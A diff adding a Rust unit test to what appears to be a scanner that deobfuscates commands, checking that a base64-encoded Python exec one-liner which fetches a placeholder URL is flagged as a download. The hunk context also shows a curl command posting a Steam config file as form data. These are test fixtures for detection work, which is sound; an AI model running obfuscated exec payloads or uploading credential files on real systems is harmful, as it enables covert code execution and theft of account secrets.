@@ -11606,6 +11606,32 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_multiline_base64_import_alias_recurses_into_decoded_source_urls() {
+        use base64::Engine;
+
+        let payload = "import requests; requests.get('https://py.example/base64-paren-import')";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            &format!(
+                "python -c \"from base64 import (\n    b64decode as dec,\n); exec(dec('{b64}'))\""
+            ),
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/base64-paren-import" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python multiline base64 import alias: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
         use base64::Engine;
 
